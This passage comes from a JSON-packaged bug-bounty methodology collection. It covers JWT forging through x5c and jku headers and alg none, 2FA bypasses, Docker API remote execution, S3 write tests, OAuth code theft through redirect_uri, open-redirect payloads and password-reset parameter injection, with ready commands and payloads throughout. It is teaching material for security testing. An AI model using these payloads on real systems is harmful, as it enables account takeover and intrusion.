http://192.87.15.2:8080/attacker.crt\" you can use repl.it to host\r\n8. Done Use forged jwt token in request.\r\n\r\nx5c Claim Misuse:\r\nNote:The algorithm used for signing the token is “RS256”.\r\nThe token is using x5c header parameter which contains the X.509 certificate to be used for token verification.\r\nThe token has various fields: n, e, x5c, x5t, kid. Also, notice that kid value is equal to x5t value.\r\n\r\n1. Turn Intercept on in burp and Login to Web App\r\n2. Forward the request until you get JWT token.\r\n3. Decode the JWT token and check if it contents x5c attribute in Header section.\r\n* https://jwt.io automatically extracts the X.509 certificate and places it in the “Verify Signature” sub-section in “Decoded” section.\r\n\r\n4. Create a self-signed certificate:\r\n\t\t\"openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt\"\r\n5. Extracting RSA public key parameters (n and e) from the generated certificate\r\n\t\t\"openssl x509 -in attacker.crt -text\"\r\n6. Converting modulus (n) to base64-encoded hexadecimal strings\r\n\t\t\"echo \"Modules (n) value will be here\"| sed ‘s/://g’ | base64 | tr ‘\\n’ ‘ ‘ | sed ‘s/ //g’ | sed ‘s/=//g’\"\r\n7. Converting exponent (e) to base64-encoded hexadecimal strings\r\n\t\t\"echo \"exponent (e) here\" | base64 | sed ‘s/=//g’\"\r\n8. Finding the new x5c value\r\n\t\t\"cat attacker.crt | tr ‘\\n’ ‘ ‘ | sed ‘s/ //g’\"\r\n9. Copy the contents excluding the — -BEGINCERTIFICATE — — and — — ENDCERTIFICATE — — part.\r\n8. Finding the new x5t value\r\n\t\t\"echo -n $(openssl x509 -in attacker.crt -fingerprint -noout) | sed ‘s/SHA1 Fingerprint=//g’ | sed ‘s/://g’ | base64 | sed ‘s/=//g’\"\r\n* Note: The kid parameter would also get the same value as x5t parameter.\r\n9. Creating a forged token using all the parameters calculated in the previous step.\r\n10. Visit https://jwt.io and paste the token retrieved in Step 3 in the “Encoded” section.\r\n11. Paste the X.509 certificate (attacker.crt) and the private key (attacker.key) in their respective places in the “Decoded” section.\r\n12. Manipulate Payload section and copy the forged token\r\n13. Replace the forged token in the request and forward. Done!!\r\n\r\n```\r\n\r\n### Other Attacks:\r\n\r\n****Key Database Mismanagement****\r\n\r\n[Hacking JWT Tokens: Key Database Mismanagement](https://blog.pentesteracademy.com/hacking-jwt-tokens-key-database-mismanagement-58cec7769120)\r\n\r\n****Verification Key Mismanagement****\r\n\r\n[Hacking JWT Tokens: Verification Key Mismanagement](https://blog.pentesteracademy.com/hacking-jwt-tokens-verification-key-mismanagement-1b69c89ffdfb)\r\n\r\n[Hacking JWT Tokens: Verification Key Mismanagement II](https://blog.pentesteracademy.com/hacking-jwt-tokens-verification-key-mismanagement-ii-12ca82674850)\r\n\r\n[Hacking JWT Tokens: Verification Key Mismanagement III](https://blog.pentesteracademy.com/hacking-jwt-tokens-verification-key-mismanagement-iii-7581805f4d58)\r\n\r\n[Hacking JWT Tokens: Verification Key Mismanagement IV](https://blog.pentesteracademy.com/hacking-jwt-tokens-verification-key-mismanagement-iv-582601f9d8ac)\r\n\r\n****Vulnerable Key Generator****\r\n\r\n[Hacking JWT Tokens: Vulnerable Key Generator](https://blog.pentesteracademy.com/hacking-jwt-tokens-vulnerable-key-generator-aff412d8d84d)\r\n\r\n****Transaction Replay****\r\n\r\n[Hacking JWT Tokens: Transaction Replay](https://blog.pentesteracademy.com/hacking-jwt-tokens-transaction-replay-56f449c2e0d0)\r\n\r\n[Hacking JWT Tokens: Transaction Replay II](https://blog.pentesteracademy.com/hacking-jwt-tokens-transaction-replay-ii-5d6ee5141e25)\r\n\r\n****JWS Standard for JWT****\r\n\r\n[Hacking JWT Tokens: JWS Standard for JWT](https://blog.pentesteracademy.com/hacking-jwt-tokens-jws-standard-for-jwt-666810809323)\r\n\r\n[Hacking JWT Tokens: JWS Standard for JWT II](https://medium.com/pentester-academy-blog/hacking-jwt-tokens-jws-standard-for-jwt-ii-7c92c70c7198)\r\n\r\n****Bypassing NBF Claim****\r\n\r\n[Hacking JWT Tokens: Bypassing NBF Claim](https://blog.pentesteracademy.com/hacking-jwt-tokens-bypassing-nbf-claim-4e56af41ddbb)\r\n\r\n****Special Version Claim****\r\n\r\n[Hacking JWT Tokens: Special Version Claim](https://blog.pentesteracademy.com/hacking-jwt-tokens-special-version-claim-5beed4198035)\r\n\r\n****Cross Service Relay Attack — Missing audience claim****\r\n\r\n[Hacking JWT Tokens: Cross Service Relay Attack -  Missing audience claim](https://blog.pentesteracademy.com/hacking-jwt-tokens-cross-service-relay-attack-missing-audience-claim-4168f6b4c5bb)\r\n\r\n****Cross Service Relay Attack — Misconfigured audience claim****\r\n\r\n[Hacking JWT Tokens: Cross Service Relay Attack - Misconfigured audience claim](https://blog.pentesteracademy.com/hacking-jwt-tokens-cross-service-relay-attack-misconfigured-audience-claim-a68d8efc61d)\r\n\r\n****Client Side Token Decode****\r\n\r\n[Hacking JWT Tokens: Client Side Token Decode](https://blog.pentesteracademy.com/hacking-jwt-tokens-client-side-token-decode-9db43f10a3eb)\r\n\r\n## Quick Methodology:\r\n\r\n```jsx\r\n1. Copy Jwt token from the request\r\n2. Use Jwt_Tool : https://github.com/ticarpi/jwt_tool\r\n3. use command : python3 jwt_tool.py -M at -t \"https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245\" -rh \"Authorization: Bearer eyJhbG...<JWT Token>\"\r\n4. Check for green line\r\n```\r\n\r\n# MindMap:\r\n\r\n[object Promise]\r\n\r\n[object Promise]\r\n\r\n# Labs:\r\n\r\n[TokenLab : JWTLabs](https://jwt-lab.herokuapp.com/challenges)\r\n\r\n[https://github.com/h-a-c/jwt-lab](https://github.com/h-a-c/jwt-lab)\r\n\r\n[GitHub - Sjord/jwtdemo: Practice hacking JWT tokens](https://github.com/Sjord/jwtdemo/)\r\n\r\n# Reference:\r\n\r\n### Write-ups & Reports:\r\n\r\n[CTFtime.org / Union CTF 2021 / Cr0wnAir / Writeup](https://ctftime.org/writeup/26173)\r\n\r\n[Web - JWT - Cr0wnAir - Union CTF [Walkthrough]](https://www.youtube.com/watch?v=bHF-uOIaM-o)\r\n\r\n[Exploiting JWT to Account Takeover](https://ethicalkaps.medium.com/exploiting-jwt-to-account-takeover-407b587b6cc6)\r\n\r\n[The Bad Twin: a peculiar case of JWT exploitation scenario](https://medium.com/@sandh0t/the-bad-twin-a-peculiar-case-of-jwt-exploitation-scenario-1efa03e891c0)\r\n\r\n[Hijacking accounts by retrieving JWT tokens via unvalidated redirects](https://www.shawarkhan.com/2019/01/hijacking-accounts-by-retrieving-jwt.html)\r\n\r\n[Mail.ru disclosed on HackerOne: [smena.samokat.ru] Predictable JWT...](https://hackerone.com/reports/896649)\r\n\r\n[Trint Ltd disclosed on HackerOne: Insecure Zendesk SSO...](https://hackerone.com/reports/638635)\r\n\r\n[HackerOne disclosed on HackerOne: HackerOne Jira integration plugin...](https://hackerone.com/reports/1103582)\r\n\r\n[Hacking JWT Tokens: \"kid\" Claim Misuse - Command Injection](https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-command-injection-e7f5b9def146)\r\n\r\n[Hacking JWT Tokens: Blind SQLi](https://blog.pentesteracademy.com/hacking-jwt-tokens-blind-sqli-efa2799f0e95)\r\n\r\n[Hacking JWT Tokens: jku Claim Misuse](https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c)\r\n\r\n### Blogs:\r\n\r\n[Attack Methodology · ticarpi/jwt_tool Wiki](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)\r\n\r\n[Attacking JSON Web Tokens (JWTs)](https://infosecwriteups.com/attacking-json-web-tokens-jwts-d1d51a1e17cb)\r\n\r\n[JSON Web Token Exploitation for Red Team](https://kurtikleiton.medium.com/json-web-token-exploitation-for-red-team-580eea1fe46a)\r\n\r\n[https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)\r\n\r\n[JWT Hacking 101](https://trustfoundry.net/jwt-hacking-101/)\r\n\r\n[Attacking JWT authentication](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)\r\n\r\n[How JSON Web Token(JWT) authentication works?](https://sureshdsk.dev/how-json-web-token-jwt-authentication-works)\r\n\r\n[](https://redhuntlabs.com/wp-content/uploads/2022/02/A-Practical-Guide-to-Attacking-JWT-JSON-Web-Tokens-1.pdf)\r\n\r\n[Attacks on JSON Web Token (JWT)](https://infosecwriteups.com/attacks-on-json-web-token-jwt-278a49a1ad2e)\r\n\r\n[Get a Feel of JWT ( JSON Web Token )](https://anubhav-singh.medium.com/get-a-feel-of-jwt-json-web-token-8ee9c16ce5ce)\r\n\r\n[Hacker Tools: JWT_Tool - The JSON Web Token Toolkit - Intigriti](https://blog.intigriti.com/2021/07/27/hacker-tools-jwt_tool/)\r\n\r\n### Video:\r\n\r\n[How to Exploit \"Json Web Token\"(JWT) vulnerabilities | Full Practical](https://www.youtube.com/watch?v=IYZeVdXeUro)\r\n\r\n[ATTACKING JWT FOR BEGINNERS!](https://www.youtube.com/watch?v=ghfmx4pr1Qg)\r\n\r\n### Tips:\r\n\r\n[object Promise]\r\n\r\n```python\r\nBy @MrTuxracer\r\nIf you were able to crack a JWT secret key but there are still some unguessable parameters in the payload just like a UUID, try sending an empty payload instead. This granted me admin rights more than once.\r\n```\r\n\r\n### Author:\r\n[KathanP19](https://twitter.com/KathanP19)\r\n"
    },
    {
      "OLD_JWT_ATTACK_Notes.md": "# JWT Attack\r\n\r\n### FIRST IF YOU DON'T KNOW WHAT IS JWT YOU MUST READ AND WATCH BELOW RESOURCES\r\n-----------------------------------------------------------------------\r\n* https://twitter.com/BHinfoSecurity/status/1299743624553549825?s=09\r\n* https://youtu.be/ghfmx4pr1Qg ( very begginer friendly)\r\n* https://medium.com/ag-grid/a-plain-english-introduction-to-json-web-tokens-jwt-what-it-is-and-what-it-isnt-8076ca679843\r\n* https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a\r\n* https://anubhav-singh.medium.com/get-a-feel-of-jwt-json-web-token-8ee9c16ce5ce\r\n* https://anubhav-singh.medium.com/attacks-on-json-web-token-jwt-278a49a1ad2e\r\n* Cheat Sheet - [Pentester's Lab](https://assets.pentesterlab.com/jwt_security_cheatsheet/jwt_security_cheatsheet.pdf)\r\n \r\n### NOTES FOR ATTACKING JWT\r\n* What the heck is this ?!\r\n```\r\n1. It is an authentication type \r\n2. It consists of header,payload,Signature\r\n```\r\n---------------------------------------------------------------------------------\r\n* Header \t\r\n```\r\n{\r\n \"alg\" : \"HS256\",\r\n \"typ\" : \"JWT\"\r\n}\r\n```\r\n-------------------------------------------------------------------\r\n* Payload \t\r\n```\r\n{\r\n \"loggedInAs\" : \"admin\",\r\n \"iat\" : 1422779638\r\n}\r\n```\r\n-----------------------------------------------------------------------------\r\n* Signature \t\r\n```\r\nHMAC-SHA256\r\n(\r\n secret,\r\n base64urlEncoding(header) + '.' +\r\n base64urlEncoding(payload)\r\n)\r\n```\r\n-----------------------------------------------\r\n* Changing alg to null \r\n* Example\r\n```\r\n{\r\n \"alg\" : \"NONE\",\r\n \"typ\" : \"JWT\"\r\n}\r\nNote;;////--remove the signuature\r\nYou can also use none,nOne,None,n0Ne\r\n```\r\n-------------\r\n* Change the payload like \r\n```\r\nPayload \t\r\n\r\n{\r\n \"loggedInAs\" : \"admin\", \r\n \"iat\" : 1422779638\r\n}\r\n```\r\n* Here change user to admin\r\n----------------------------------------------------\r\n # SOME MORE TIPS AND METHOD\r\n --------------------------------------------------------\r\n 1. First decode full token or 1 1 each part of token to base64\r\n 2. Change the payload use jwt web token burp\r\n 3. Changing encrption  RS256 to HS256\r\n 4. Signature not changes remove it or temper it,\r\n 5. Brute forcing the key in hs256 because it use same key to sign and verify means publickey=private key\r\n ---------------------------------------------------------------------------------------------------\r\n ### Other Easy Method\r\n```\r\n1) Create a account\r\n2) Inspect the token\r\n3) Base64 decode the header\r\n4) If any Kid= parameter are there so you can find some bugs\r\n5) Using that parameter you can also find directory traversal , i tell you how\r\n6) Change that kid= parameter with you directory traversal payload\r\n7) Change payload {\"user\":\"admin\"}\r\n8) Create a python script that generate a exploit token. (If you want that script so dm me in Twitter )\r\n9) Put that token and reload the page\r\n10) Done\r\n```\r\n---\r\n # TOOLS TO USE\r\n -----------------------------------------------------------------------------------------------\r\n * [Jwt token attack burp extention](https://github.com/portswigger/json-web-token-attacker)\r\n * Base64 decoder\r\n * jwt.io to analyse the struct of token\r\n * jwt cat for weak secret token [jwtcat](https://github.com/aress31/jwtcat) \r\n * Tool is used for validating, forging, scanning and tampering JWTs [jwt_tool](https://github.com/ticarpi/jwt_tool)\r\n * Tool to test security of JSON Web Tokens [jwtXploiter](https://github.com/DontPanicO/jwtXploiter)\r\n\r\n---------------------------------------------------------------------------------------------------------------------------\r\n### SOURCES: \r\n- Intresting blog - [Medium](https://barrymalone.medium.com/json-web-tokens-beginner-exploitation-5a44f8f6efff)\r\n* Youtube,Medium,Github,Google\r\n### Author\r\n* [Naman Shah](https://twitter.com/naman_1910)\r\n* [@kAshhadali10](https://twitter.com/kAshhadali10)\r\n* [@0xrtt](https://twitter.com/0xrtt)\r\n* [Anubhav Singh](https://twitter.com/AnubhavSingh_)\r\n"
    }
  ],
  "MFA_Bypasses": [
    {
      "2FA_Bypass.md": "# 2FA Bypass\r\n\r\n* 1:- Password Reset Disable 2FA\t\r\n* 2:- No Rate limit\r\n* 3:- Sending all alphabets instead of number\r\n* 4:- Status Code Manipulation\r\n* 5:- 2FA bypass by substituting part of the request from the session of another account. \r\n    ```\r\n    If a parameter with a specific value is sent to verify the code in the request, try sending the value from the request of another account.\r\n    \r\n    For example, when sending an OTP code, the form ID/user ID or cookie is checked, which is associated with sending the code. If we apply the data from the parameters of the account on which you want to bypass code verification (Account 1) to a session of a completely different account (Account 2), receive the code and enter it on the second account, then we can bypass the protection on the first account. After reloading the page, 2FA should disappear.\r\n    ```\r\n * 6:- Bypass 2FA using the “memorization” functionality.\r\n\t\t\r\n    `Many sites that support 2FA, have a “remember me” functionality. It is useful when the user doesn’t want to enter a 2FA code on subsequent login windows. And it is important to identify the way in which 2FA is “remembered”. This can be a cookie, a value in session/local storage, or simply attaching 2FA to an IP address.`\r\n * 7:- OTP Leakage in Response\r\n * 8:- Bypassing 2fa Via OAuth mechanism ( Mostly not Applicable one )\r\n\t\t\r\n    `Site.com requests Facebook for OAuth token > Facebook verifies user account > Facebook send callback code > Site.com logs a user in (Rare case)`\r\n * 9:- Bypassing 2fa using response manipulation\r\n   ```\r\n   Enter correct OTP -> Intercept & capture the response -> logout -> enter wrong OTP -> Intercept & change the response with successful previous response -> logged in\r\n   ```\r\n * 10:- CSRF on 2FA Disable Feature.\r\n    ```\r\n    Signup for two account -> Login into attacker account & capture the disable 2FA request -> generate CSRF POC with .HTML extension -> Login into victim account and fire the request — — -> It disable 2FA which leads to 2FA Bypass.\r\n    ```\r\n * 11:- Bypass 2FA by Adding null or 000000\r\n * 12:- Bypass 2FA by Batch API request\r\n    ```\r\n    Suppose if 2FA parameter like \"code\" of \"OTP\" is going with the request, add same parameter into the request multiple times like BATCH Mode for REST APi.\r\n    ```\r\n\r\n* https://twitter.com/FaniMalikHack/status/1395042756108505092\r\n* https://twitter.com/FaniMalikHack/status/1402627994833805313\r\n\r\n## Twitte :- [Fani Malik](https://twitter.com/FaniMalikHack)\r\n"
    },
    {
      "README.md": "# Some MindMaps\r\n---\r\n### 2FA Bypass by Hack3rScr0lls\r\n[object Promise]\r\n\r\n### Source\r\n* [https://twitter.com/hackerscrolls/status/1256276376019230720](https://twitter.com/hackerscrolls/status/1256276376019230720)\r\n\r\n### 2FA Bypass by Harshbothra \r\n* [MindMap](https://www.mindmeister.com/1736437018?t=SEeZOmvt01)\r\n\r\n### Author\r\n* [KathanP19](https://twitter.com/KathanP19)\r\n"
    }
  ],
  "Misconfigurations": [
    {
      "Default_Credential_And_Admin_Panel.md": "\r\n## Default Credentials Basics\r\n\r\n- Default Software Configurations for admin console of webapp\r\n```\r\nhttps://www.target.com/admin\r\nhttps://www.target.com/admin-console\r\nhttps://www.target.com/console\r\nhttps://admin.target.com\r\nhttps://admin-console.target.com\r\nhttps://console.target.com\r\n```\r\n\r\n## 1. Getting access through third party services\r\n\r\n* When the admin console login page is working on a third party service,then just search for it's default credentials on Google\r\n* Third Party service URL are of the format: https://target.<TPS Name>.com/login\r\n* Some examples are Okta,WP etc\r\n\r\n## 2. Bypass to get access to login page\r\n```\r\n1. This bypass is used when you are forbidden to get access to admin login page\r\n2. We use Header Injection for this bypass\r\n3. `X-Orginal-URL: /admin` or `X-Rewrite-URL:/admin`\r\n4. Use this Header under Host\r\n\r\n* Use Burp to capture then check\r\n```\r\n## Hackerone Reports :\r\n- https://hackerone.com/reports/192074\r\n- https://hackerone.com/reports/174883\r\n- https://hackerone.com/reports/398797\r\n\r\n## Reference : \r\nhttps://www.owasp.org/index.php/Testing_for_default_credentials_(OTG-AUTHN-002)\r\nhttps://www.owasp.org/index.php/Testing_for_Default_or_Guessable_User_Account_(OWASP-AT-003)\r\n\r\n## Author:\r\n* [@e11i0t_4lders0n](https://twitter.com/e11i0t_4lders0n)\r\n"
    },
    {
      "Docker.md": "# Docker API unauthorized RCE\r\n- Docker is an open-source platform for developers and other IT professionals to help build, ship, and run distributed applications.\r\nthe docker daemon (dockerd) provides an API service used for remote control of docker service the default daemon listen on Unix /var/run/docker.sock and when bound to a public interface can be used by an attacker to compromise container system due to lack of default authentication\r\n\r\n## Background concept:\r\n\r\n- The host is running docker: daemon bound to the external interface with no access control or authentication\r\n- Attacker uses docker API function to enumerate manage and control the container service the attacker is able to control existing deployed container or create another one.\r\n- Docker API provides JSON response containing the output of command issued.\r\n- Enumerating docker API services\r\n- By default, the Docker host remote API listens on ports 2375 / 2376 and has no authentication. If the port is not blocked, docker host APIs can be accessed over the public internet.\r\n\r\n```\r\nnmap IP:2375/2376\r\nnmap -p- IP\r\nnmap -Pn -p 2375 IP\r\nnmap -sV -p 2375 IP\r\n```\r\n- To confirm that the docker is service is running on the target we can give the string in the browser and check the response\r\nex: `https://IP:2375`\r\n- we will receive a response something like this\r\n`{\"message\":\"page not found\"}`\r\n- and to confirm the version details we can use this\r\n`https://IP:2375/version`\r\n\r\n- The command used to exploit\r\n\r\n- This command is used to get all the information about the docker container\r\n`docker -H IP:2375 info`\r\n\r\n- List all the running containers\r\n`docker -H IP:2375 ps`\r\n\r\n- List all the stopped containers\r\n`docker -H IP:2375 ps -a`\r\n\r\n- Docker command for RCE\r\n`docker -H IP:2375 exec -it container_name /bin/bash`\r\n\r\n## Contributor:\r\n- [N3T_hunt3r](https://twitter.com/N3T_hunt3r)\r\n"
    },
    {
      "S3-Bucket_Misconfig.md": "\r\n##  How to check for amazon S3 Bucket Misconfiguration.\r\n* First of all, you need to install aws cli - `Pip install awscli`\r\n* Dont Forget to Set:\r\n\\- Access key \r\n\\- Secret key\r\n\r\n**1.** **Check is you can list iteams from the bucket.** \r\n`aws s3 ls s3://<bucket name>`\r\n* See if you are able to access that bucket.\r\n* If the bucket is not accessible, still we can try to exploit it.\r\n\r\n* If you are getting some errors then run this command \r\n`aws s3 ls s3://<bucket name> --no-sign-request`\r\n\r\n**2. Try moving the files or deleting it and see if you are able to do that or not** \r\n* If it is possible to move files then it is vulnerable and you can report it otherwise it is not vulnerable\r\n* First Make a file \r\n`echo \"Testing purpose\" >> test.txt `\r\n* Now try command to move the file into the bucket. \r\n`aws s3 mv test.txt s3://<bucket name>`\r\n* Also try command to copy the file from local drive to the S3 bucket. \r\n`aws s3 cp test.txt s3://[bucketname]/test.txt`\r\n\r\n**3.  Delete files from the bucket.**\r\n* Command to delete the file into the bucket\r\n`aws s3 rm test.txt s3://<bucket name>/test.txt` *(if that is present)*\r\n\r\n\r\n## References :\r\n * [Hackerone Report](https://hackerone.com/reports/700051) \r\n * [Hackerone Report](https://hackerone.com/reports/229690) \r\n * [https://bugbountypoc.com/s3-bucket-misconfiguration-from-basics-to-pawn](https://bugbountypoc.com/s3-bucket-misconfiguration-from-basics-to-pawn)\r\n \r\n## Author :\r\n * [Anishka Shukla](https://twitter.com/AnishkaShukla)\r\n * [Anubhav Singh](https://twitter.com/AnubhavSingh_)\r\n"
    }
  ],
  "OAuth": [
    {
      "OAuth 2.0 Hunting Methodology.md": "## OAuth 2.0 Hunting Methodology\r\nIn OAuth there are 2 types of flows/grant types:\r\n- Authorization code flow\r\n- Implicit flow\r\n\r\nNote: *if the oauth service uses authorization code flow then there is little to no chance of finding a bug but if the oauth service uses implicit flow then there is a good chance of finding bugs*\r\n\r\n## How to differentiate between implicit and authorization code grant type\r\n\r\n### <ins>Authorization code grant type</ins>\r\n\r\n**Authorization request**\r\n- When you send an authorization request to the oauth service in the client application , The client application sends a request to the OAuth service's `/authorization` endpoint asking for permission to access specific user data.\r\n\r\n> Note: the endpoint name can be different according to the application like `/auth` etc. but you can identify them based on the parameters used.\r\n\r\n- The request in authorization code flow looks like:\r\n\r\n```\r\nGET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 \r\nHost: oauth-authorization-server.com\r\n```\r\n\r\n- So, in authorization code grant type the `response_type` parameter should be `code` . this code is used to request access token from the oauth service.\r\n\r\n- Now, after the user login to their account with the OAuth provider and gives consent to access their data. the user will be redirected to the `/callback` endpoint that was specified in the `redirect_uri` parameter of the authorization request. The resulting `GET` request will contain the authorization code as a query parameter.\r\n\r\n**Authorization code grant**\r\n\r\n```\r\nGET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1 \r\nHost: client-app.com\r\n```\r\n\r\n- Rest of the stuff like access token grant and API calls are done in the back-end so you cannot see them in your proxy.\r\n\r\n```md\r\n**factors that determine authorization code flow:**\r\n- Initial authorization request has `response_type=code`\r\n- the `/callback` request contains authorization code as a parameter.\r\n```\r\n\r\n### <ins>Implicit grant type</ins>\r\n\r\n**Authorization request**\r\n- The implicit flow starts in pretty much the same way as the authorization code flow. The only major difference is that the `response_type` parameter must be set to `token`.\r\n\r\n```\r\nGET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 \r\nHost: oauth-authorization-server.com\r\n```\r\n\r\n**Access Token grant**\r\n\r\n- If the user logs in and gives their consent to the request access , the oauth service redirects the user to the `/callback` endpoint but instead of sending a parameter containing an authorization code, it will send the access token and other token-specific data as a URL fragment.\r\n\r\n```\r\nGET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 \r\nHost: client-app.com\r\n```\r\n\r\n\r\n```md\r\n**factors that determine Implicit flow:**\r\n- Initial authorization request has `response_type=token`\r\n- the `/callback` request contains access token as a parameter.\r\n```\r\n\r\n---\r\n\r\n*Now that you have determined which grant type the OAuth service uses , you can proceed to find bugs.*\r\n\r\n### Method-1 (Auth bypass in OAuth implicit flow)\r\n- To log the user in every time with oauth , the client application sends a POST request to the server containing user info (email-id, username) and access token to generate a session cookie.\r\n\t- so, find a POST req in http history which contains user-info and access token.\r\n- Usually in implicit flow , the server doesn't validate the access token so you can change the parameters like email-id and/or username to impersonate another user and bypass authentication.\r\n\r\n### Method-2 (Forced profile linking)\r\n- This is similar to a traditional CSRF attack so the impact may not be that much.\r\n- In this when you sign in with social media profile, you will be redirected to the social media website and then you log in with social media credentials.\r\n- Now the next time when you log in , you will be logged in instantly. capture this request with burp.\r\n- In the http history there would be a request similar to `/auth?client_id[...]` . In that request the redirect_uri sends the authorization code to something like `/oauth-linking`. Check if the `state` parameter is present. if its not present then it is vulnerable to CSRF attacks. because that means there is no way for server to verify if this information is from the same user.\r\n- So absence of `state` parameter in this request is itself a vulnerability.\r\n- Past this you can try sending the exploit link to the victim and complete the oauth flow by attaching your social media profile to their account.\r\n\t- For this copy URL of the request in burp and drop the request so that the code isn't used.\r\n\t- Turn off intercept and log out of website.\r\n\t- Now you can send this link to the victim or you can set it as an iframe on your website `<iframe src=\"request URL\"></iframe>`.  and deliver your website link to the victim.\r\n\t- When their browser loads the `iframe`, it will complete the OAuth flow using your social media profile, attaching it to the victim account.\r\n\r\n### Method-3 (Account hijacking via redirect_uri)\r\n- Complete the oauth sign in flow and log out then log back in and you will be logged in instantly this time.\r\n- Find the most recent Authorization request in http history, it should be similar to `GET /auth?client_id=[...]`.\r\n- Check the redirect_uri param and try to change it. If you can redirect it to an external site then good , if not then try different endpoints on the same website and check if they work.\r\n- if there is an open redirect then change the redirect_uri to your webhook site link and follow the redirect. \r\n- Now check for a log entry in webhook.site containing an authorization code.\r\n- So now you can send the request url to the victim (or make an iframe as mentioned above) with redirect_uri set as your webhook site and leak their authorization codes.\r\n- If the victim clicks on the link then you would see the authorization code in your webhook.site logs.\r\n- now you can use this stolen code in the callback request and the rest of the OAuth flow will be completed automatically and you will be logged in as the admin user.\r\n\r\n## Author:\r\n[Pyr0sec](https://twitter.com/Pyr0sec)\r\n"
    },
    {
      "README.md": "# Some MindMap\r\n---\r\n### OAuth by Hack3rSr0lls\r\n[object Promise]\r\n\r\n### Source\r\n* [https://twitter.com/hackerscrolls/status/1269266750467649538](https://twitter.com/hackerscrolls/status/1269266750467649538)\r\n\r\n### Author\r\n* [KathanP19](https://twitter.com/KathanP19)\r\n"
    }
  ],
  "Open_Redirection": [
    {
      "find_OpenRedirect_trick.md": "## A small trick to find Open Redirection if you couldn't find any Redirection parameters.\r\n\r\n*\"I apply this everytime while testing web applications and found many Open Redirects and even an XSS using this trick!\"*\r\n\r\n### Steps:\r\n------------------------------------------------------------------------------------------------------------------------------------------------------------\r\n      1. If the Applictaion have a user Sign-In/Sign-Up feature, then register a user and log in as the user.\r\n      \r\n      2. Go to your user profile page , for example : samplesite.me/accounts/profile\r\n      \r\n      3. Copy the profile page's URL\r\n      \r\n      4. Logout and Clear all the cookies and go to the homepage of the site.\r\n      \r\n      5. Paste the Copied Profile URL on the address bar \r\n      \r\n      6. If the site prompts for a login , check the address bar , you may find the login page with a redirect parameter like the following\r\n            - https://samplesite.me/login?next=accounts/profile\r\n            - https://samplesite.me/login?retUrl=accounts/profile\r\n      \r\n      7. Try to exploit the parameter by adding an external domain and load the crafted URL\r\n          eg:- https://samplesite.me/login?next=https://evil.com/\r\n                         (or)\r\n            https://samplesite.me/login?next=https://samplesite.me@evil.com/  #(to beat the bad regex filter)\r\n      \r\n      8. If it redirects to evil.com , thers's your open redirection bug.\r\n       \r\n      9. Try to leverage it to XSS\r\n           eg:- https://samplesite.me/login?next=javascript:alert(1);//\r\n\r\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\r\n       \r\n #### Author:  [febinrev](https://twitter.com/febinrev) \r\n"
    },
    {
      "Open_Redirection_Bypass.md": "# Open Redirection Bypass Trick:\r\n\r\nThis bypass I found in a application while I doing pentesting. I hope it will helps you too!\r\n\r\n1. While you I trying to redirect https://targetweb.com?url=http://attackersite.com it did not redirected!\r\n2. I Created a new subdomain with with www.targetweb.com.attackersite.com\r\n3. And when I tried to redirect with https://targetweb.com?url=www.targetweb.com.attackersite.com\r\n4. It will successfully redirected to the www.targetweb.com.attackersite.com website!\r\n5. Due to the bad regex it has been successfully bypass their protection!\r\n\r\n### Authors:\r\n* [@bishal0x01](https://twitter.com/bishal0x01)\r\n\r\n### Reference Tweets:\r\n* https://twitter.com/bishal0x01/status/1262021038080053248\r\n"
    }
  ],
  "Parameter_Pollution": [
    {
      "Parameter_Pollution_in_social_sharing_buttons.md": "# Parameter Pollution in social sharing buttons\r\n\r\nHi Guys,\r\nThough it is not severe bug.But still some organizations take this seriously.\r\n\r\n## Steps :\r\n\r\n```\r\n1.Browse through your target.\r\n  say https://target.com\r\n2.Find a article or blog present on target website which must have a link to share that blog on different social networks such as\r\n  Facebook,Twitter etc.\r\n3.Let's say we got and article with url:\r\n  https://taget.com/how-to-hunt \r\n  then just appened it with payload ?&u=https://attacker.com/vaya&text=another_site:https://attacker.com/vaya\r\n  so our url will become \r\n  https://taget.com/how-to-hunt?&u=https://attacker.com/vaya&text=another_site:https://attacker.com/vaya\r\n4.Now hit enter with the abover url and just click on share with social media.\r\n  Just observe the content if it is including our payload i.e. https://attacker.com\r\n  Then it is vulnerable or else try next target.\r\n```  \r\n## References:\r\n* https://hackerone.com/reports/105953\r\n* Google\r\n  \r\n## Author\r\n* [KenAdams000](https://twitter.com/KenAdams000)\r\n"
    }
  ],
  "Password_Reset_Functionality": [
    {
      "Account_Takeover_By_Password_Reset_Functionality.md": "\r\n```\r\n1. email= victim@gmail.com&email=attacker@gmil.com\r\n2. email= victim@gmail.com%20email=attacker@gmil.com\r\n3. email= victim@gmail.com |email=attacker@gmil.com\r\n4. email= victim@gmail.com%0d%0acc:attacker@gmil.com\r\n5. email= victim@gmail.com&code= my password reset token\r\n```\r\n### Authors\r\n\r\n@tamimhasan404\r\n"
    },
    {
